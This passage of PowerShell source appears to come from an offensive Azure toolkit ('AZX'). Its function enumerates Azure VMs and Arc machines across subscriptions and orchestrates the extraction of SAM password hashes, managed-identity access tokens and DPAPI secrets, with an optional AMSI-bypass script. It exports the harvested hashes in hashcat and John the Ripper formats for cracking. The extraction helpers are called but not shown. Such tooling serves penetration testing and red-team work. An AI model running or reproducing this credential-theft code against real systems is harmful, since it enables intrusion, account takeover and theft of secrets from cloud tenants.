    Filter by resource group.
.PARAMETER SubscriptionId
    Filter by subscription.
.PARAMETER CredMethod
    Extraction method: auto, sam, tokens, dpapi, all.
.PARAMETER HashcatFormat
    Output hashes in hashcat format.
.PARAMETER JohnFormat
    Output hashes in John the Ripper format.
.PARAMETER AmsiBypass
    Path to AMSI bypass script.
.PARAMETER Timeout
    Execution timeout in seconds.
.PARAMETER ExportPath
    Path to export results.
#>
function Invoke-CredentialExtraction {
    param(
        [Parameter(Mandatory = $false)]
        [string]$VMName,

        [Parameter(Mandatory = $false)]
        [switch]$AllVMs,

        [Parameter(Mandatory = $false)]
        [string]$DeviceName,

        [Parameter(Mandatory = $false)]
        [switch]$AllDevices,

        [Parameter(Mandatory = $false)]
        [string]$ResourceGroup,

        [Parameter(Mandatory = $false)]
        [string]$SubscriptionId,

        [Parameter(Mandatory = $false)]
        [ValidateSet("auto", "sam", "tokens", "dpapi", "all")]
        [string]$CredMethod = "auto",

        [Parameter(Mandatory = $false)]
        [switch]$HashcatFormat,

        [Parameter(Mandatory = $false)]
        [switch]$JohnFormat,

        [Parameter(Mandatory = $false)]
        [string]$AmsiBypass,

        [Parameter(Mandatory = $false)]
        [int]$Timeout = 300,

        [Parameter(Mandatory = $false)]
        [string]$ExportPath
    )

    # Show banner
    Write-ColorOutput -Message "`n[*] AZX - Credential Extraction" -Color "Yellow"
    Write-ColorOutput -Message "[*] Command: creds (Azure equivalent of nxc smb --sam)`n" -Color "Cyan"

    # Show OPSEC warning
    Show-CredentialOPSECWarning

    # Determine extraction methods to run
    $runSAM = $false
    $runTokens = $false
    $runDPAPI = $false

    switch ($CredMethod) {
        "sam" { $runSAM = $true }
        "tokens" { $runTokens = $true }
        "dpapi" { $runDPAPI = $true }
        "all" { $runSAM = $true; $runTokens = $true; $runDPAPI = $true }
        "auto" { $runSAM = $true; $runTokens = $true; $runDPAPI = $true }  # auto = all
    }

    # Collect targets
    $targets = @()
    $seenTargets = @{}  # For deduplication

    # Azure VMs
    if ($VMName -or $AllVMs) {
        Write-ColorOutput -Message "[*] Enumerating Azure VMs..." -Color "Yellow"

        $subscriptions = Get-AzSubscription -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        if ($SubscriptionId) {
            $subscriptions = $subscriptions | Where-Object { $_.Id -eq $SubscriptionId -or $_.Name -eq $SubscriptionId }
        }

        foreach ($sub in $subscriptions) {
            Set-AzContext -SubscriptionId $sub.Id -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null

            $vms = Get-AzVM -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
            if ($ResourceGroup) {
                $vms = $vms | Where-Object { $_.ResourceGroupName -eq $ResourceGroup }
            }
            if ($VMName) {
                $vms = $vms | Where-Object { $_.Name -eq $VMName }
            }

            foreach ($vm in $vms) {
                # Deduplication key: Name + ResourceGroup + SubscriptionId
                $dedupeKey = "$($vm.Name)|$($vm.ResourceGroupName)|$($sub.Id)"
                if ($seenTargets.ContainsKey($dedupeKey)) {
                    continue
                }
                $seenTargets[$dedupeKey] = $true

                $osType = if ($vm.StorageProfile.OsDisk.OsType -eq "Windows") { "Windows" } else { "Linux" }
                $targets += [PSCustomObject]@{
                    Name = $vm.Name
                    Type = "AzureVM"
                    ResourceGroup = $vm.ResourceGroupName
                    Subscription = $sub.Name
                    SubscriptionId = $sub.Id
                    OSType = $osType
                    Location = $vm.Location
                }
            }
        }
    }

    # Arc Devices
    if ($DeviceName -or $AllDevices) {
        Write-ColorOutput -Message "[*] Enumerating Arc devices..." -Color "Yellow"

        $subscriptions = Get-AzSubscription -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
        if ($SubscriptionId) {
            $subscriptions = $subscriptions | Where-Object { $_.Id -eq $SubscriptionId -or $_.Name -eq $SubscriptionId }
        }

        foreach ($sub in $subscriptions) {
            Set-AzContext -SubscriptionId $sub.Id -ErrorAction SilentlyContinue -WarningAction SilentlyContinue | Out-Null

            $arcMachines = Get-AzConnectedMachine -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
            if ($ResourceGroup) {
                $arcMachines = $arcMachines | Where-Object { $_.ResourceGroupName -eq $ResourceGroup }
            }
            if ($DeviceName) {
                $arcMachines = $arcMachines | Where-Object { $_.Name -eq $DeviceName }
            }

            foreach ($arc in $arcMachines) {
                # Deduplication key
                $dedupeKey = "$($arc.Name)|$($arc.ResourceGroupName)|$($sub.Id)"
                if ($seenTargets.ContainsKey($dedupeKey)) {
                    continue
                }
                $seenTargets[$dedupeKey] = $true

                $osType = if ($arc.OSName -match "Windows") { "Windows" } else { "Linux" }
                $targets += [PSCustomObject]@{
                    Name = $arc.Name
                    Type = "Arc"
                    ResourceGroup = $arc.ResourceGroupName
                    Subscription = $sub.Name
                    SubscriptionId = $sub.Id
                    OSType = $osType
                    Location = $arc.Location
                }
            }
        }
    }

    if ($targets.Count -eq 0) {
        Write-ColorOutput -Message "[!] No targets found matching criteria" -Color "Red"
        return
    }

    Write-ColorOutput -Message "[*] Found $($targets.Count) target(s)`n" -Color "Green"

    # Results collection
    $allResults = @()
    $stats = @{
        Targets = $targets.Count
        SAMHashes = 0
        Tokens = 0
        DPAPISecrets = 0
        Errors = 0
    }

    # Process each target
    foreach ($target in $targets) {
        Write-ColorOutput -Message "[*] Target: $($target.Name) ($($target.OSType)) [RG: $($target.ResourceGroup), Sub: $($target.Subscription)]" -Color "Cyan"

        # SAM Extraction
        if ($runSAM -and $target.OSType -eq "Windows") {
            $samResult = Invoke-SAMExtraction -Target $target -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $samResult

            if ($samResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "SAM" -Data $samResult.Data
                if ($samResult.Data.Hashes) {
                    $stats.SAMHashes += $samResult.Data.Hashes.Count
                }
            } else {
                $stats.Errors++
                if ($samResult.Error) {
                    Write-ColorOutput -Message "    [!] SAM extraction failed: $($samResult.Error)" -Color "Red"
                }
            }
        }

        # Token Extraction
        if ($runTokens) {
            $tokenResult = Invoke-TokenExtraction -Target $target -Timeout $Timeout
            $allResults += $tokenResult

            if ($tokenResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "TOKEN" -Data $tokenResult.Data
                if ($tokenResult.Data.Tokens) {
                    $stats.Tokens += $tokenResult.Data.Tokens.Count
                }
            } else {
                $stats.Errors++
                if ($tokenResult.Error) {
                    Write-ColorOutput -Message "    [!] Token extraction failed: $($tokenResult.Error)" -Color "Red"
                }
            }
        }

        # DPAPI Extraction
        if ($runDPAPI -and $target.OSType -eq "Windows") {
            $dpapiResult = Invoke-DPAPIExtraction -Target $target -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $dpapiResult

            if ($dpapiResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "DPAPI" -Data $dpapiResult.Data
                if ($dpapiResult.Data) {
                    $wifiCount = if ($dpapiResult.Data.WiFiProfiles) { $dpapiResult.Data.WiFiProfiles.Count } else { 0 }
                    $credCount = if ($dpapiResult.Data.CredentialManager) { $dpapiResult.Data.CredentialManager.Count } else { 0 }
                    $browserCount = if ($dpapiResult.Data.BrowserPaths) { $dpapiResult.Data.BrowserPaths.Count } else { 0 }
                    $stats.DPAPISecrets += ($wifiCount + $credCount + $browserCount)
                }
            } else {
                $stats.Errors++
                if ($dpapiResult.Error) {
                    Write-ColorOutput -Message "    [!] DPAPI extraction failed: $($dpapiResult.Error)" -Color "Red"
                }
            }
        }

        Write-Host ""  # Spacing between targets
    }

    # Summary
    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] EXTRACTION SUMMARY" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] Targets: $($stats.Targets) | SAM Hashes: $($stats.SAMHashes) | Tokens: $($stats.Tokens) | DPAPI Secrets: $($stats.DPAPISecrets) | Errors: $($stats.Errors)" -Color "White"

    # Export results
    if ($ExportPath) {
        try {
            # Build export data
            $exportData = @()

            foreach ($result in $allResults) {
                $baseEntry = @{
                    Subscription = $result.Subscription
                    TargetName = $result.TargetName
                    ResourceGroup = $result.ResourceGroup
                    TargetType = $result.TargetType
                    OSType = $result.OSType
                    ExtractionType = $result.ExtractionType
                    Success = $result.Success
                    Error = $result.Error
                }

                switch ($result.ExtractionType) {
                    "SAM" {
                        if ($result.Data.Hashes) {
                            foreach ($hash in $result.Data.Hashes) {
                                $entry = $baseEntry.Clone()
                                $entry.Username = $hash.Username
                                $entry.RID = $hash.RID
                                $entry.LMHash = $hash.LMHash
                                $entry.NTHash = $hash.NTHash
                                $exportData += [PSCustomObject]$entry
                            }
                        } else {
                            $entry = $baseEntry.Clone()
                            $entry.SAMPath = $result.Data.SAMPath
                            $entry.SYSTEMPath = $result.Data.SYSTEMPath
                            $entry.SECURITYPath = $result.Data.SECURITYPath
                            $exportData += [PSCustomObject]$entry
                        }
                    }
                    "TOKEN" {
                        if ($result.Data.Tokens) {
                            foreach ($token in $result.Data.Tokens) {
                                $entry = $baseEntry.Clone()
                                $entry.Resource = $token.Resource
                                $entry.AccessToken = $token.Token
                                $entry.ExpiresIn = $token.ExpiresIn
                                $exportData += [PSCustomObject]$entry
                            }
                        } else {
                            $entry = $baseEntry.Clone()
                            $entry.HasManagedIdentity = $result.Data.HasManagedIdentity
                            $exportData += [PSCustomObject]$entry
                        }
                    }
                    "DPAPI" {
                        $entry = $baseEntry.Clone()
                        $entry.WiFiProfiles = ($result.Data.WiFiProfiles | ConvertTo-Json -Compress)
                        $entry.CredentialManager = ($result.Data.CredentialManager | ConvertTo-Json -Compress)
                        $entry.BrowserPaths = ($result.Data.BrowserPaths | ConvertTo-Json -Compress)
                        $exportData += [PSCustomObject]$entry
                    }
                }
            }

            # Determine export format
            if ($ExportPath -match "\.json$") {
                $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Encoding UTF8
            } elseif ($ExportPath -match "\.csv$") {
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation
            } elseif ($HashcatFormat) {
                # Hashcat format: username:hash
                $hashcatOutput = @()
                foreach ($result in $allResults | Where-Object { $_.ExtractionType -eq "SAM" -and $_.Data.Hashes }) {
                    foreach ($hash in $result.Data.Hashes) {
                        $hashcatOutput += "$($hash.Username):$($hash.NTHash)"
                    }
                }
                $hashcatOutput | Out-File -FilePath $ExportPath -Encoding UTF8
            } elseif ($JohnFormat) {
                # John format: username:RID:LM:NT:::
                $johnOutput = @()
                foreach ($result in $allResults | Where-Object { $_.ExtractionType -eq "SAM" -and $_.Data.Hashes }) {
                    foreach ($hash in $result.Data.Hashes) {
                        $johnOutput += "$($hash.Username):$($hash.RID):$($hash.LMHash):$($hash.NTHash):::"
                    }
                }
                $johnOutput | Out-File -FilePath $ExportPath -Encoding UTF8
            } else {
                # Default: JSON
                $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Encoding UTF8
            }

            Write-ColorOutput -Message "[+] Results exported to: $ExportPath" -Color "Green"

        } catch {
            Write-ColorOutput -Message "[!] Failed to export results: $($_.Exception.Message)" -Color "Red"
        }
    }

    return $allResults
}
